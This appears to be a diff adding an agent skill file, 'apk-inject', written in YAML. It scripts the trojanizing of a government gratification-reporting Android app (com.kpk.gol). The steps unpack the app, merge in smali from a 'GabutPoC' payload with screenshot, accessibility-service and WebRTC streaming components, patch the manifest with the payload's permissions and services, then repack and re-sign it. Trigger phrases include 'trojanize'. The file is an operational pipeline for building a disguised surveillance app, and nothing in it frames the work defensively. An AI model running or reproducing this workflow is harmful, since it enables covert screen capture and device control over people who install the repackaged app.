@@ -1,0 +1,79 @@
+name: apk-inject
+description: "Inject GabutPoC screenshot + accessibility payload into GOL APK. Steps: unpack -> merge smali -> update manifest -> repack -> sign."
+trigger:
+  patterns:
+    - inject
+    - penanaman
+    - plant apk
+    - merge dex
+    - repackage
+    - gabung apk
+    - trojanize
+
+steps:
+  - name: unpack_target
+    description: "Unpack target APK (GOL)"
+    command: "java -jar apktool.jar d {target_apk} -o {working_dir}/target_unpacked -f"
+
+  - name: unpack_payload
+    description: "Unpack payload APK (GabutPoC)"
+    command: "java -jar apktool.jar d {payload_apk} -o {working_dir}/payload_unpacked -f"
+
+  - name: merge_smali
+    description: "Copy payload smali files to target"
+    command: |
+      Copy-Item -Recurse -Path "{working_dir}/payload_unpacked/smali/com/example/screenwhip" `
+        -Destination "{working_dir}/target_unpacked/smali/com/example/screenwhip" -Force
+      New-Item -ItemType Directory -Path "{working_dir}/target_unpacked/smali/org/webrtc" -Force
+      Copy-Item -Path "{working_dir}/payload_unpacked/smali/org/webrtc/ForcedH264Encoder*" `
+        -Destination "{working_dir}/target_unpacked/smali/org/webrtc/" -Force
+
+  - name: merge_resources
+    description: "Copy payload resources (accessibility config)"
+    command: |
+      if (Test-Path "{working_dir}/payload_unpacked/res/xml/accessibility_service_config.xml") {
+        Copy-Item -Path "{working_dir}/payload_unpacked/res/xml/accessibility_service_config.xml" `
+          -Destination "{working_dir}/target_unpacked/res/xml/" -Force
+      }
+
+  - name: update_manifest
+    description: "Add GabutPoC permissions, services, and receivers to AndroidManifest.xml"
+    command: "python scripts/patch_manifest.py {working_dir}/target_unpacked/AndroidManifest.xml"
+
+  - name: repack
+    description: "Repack modified APK"
+    command: "java -jar apktool.jar b {working_dir}/target_unpacked -o {working_dir}/{output_apk}"
+
+  - name: sign
+    description: "Sign APK with debug key"
+    command: |
+      apksigner sign --ks {keystore} --ks-pass pass:{ks_pass} `
+        --key-pass pass:{key_pass} --v2-signing-enabled true --v3-signing-enabled true `
+        {working_dir}/{output_apk}
+
+  - name: verify_sign
+    description: "Verify APK signature"
+    command: "apksigner verify --verbose {working_dir}/{output_apk}"
+
+params:
+  target_apk:
+    description: "Path to target APK (Gratifikasi Online GOL)"
+    default: "com.kpk.gol.apk"
+  payload_apk:
+    description: "Path to payload APK (GabutPoC)"
+    default: "../lets/android/app/build/outputs/apk/debug/app-x86_64-debug.apk"
+  working_dir:
+    description: "Working directory"
+    default: "build/inject"
+  output_apk:
+    description: "Output file name"
+    default: "gol_modified.apk"
+  keystore:
+    description: "Debug keystore path"
+    default: "~/.android/debug.keystore"
+  ks_pass:
+    description: "Keystore password"
+    default: "android"
+  key_pass:
+    description: "Key password"
+    default: "android"
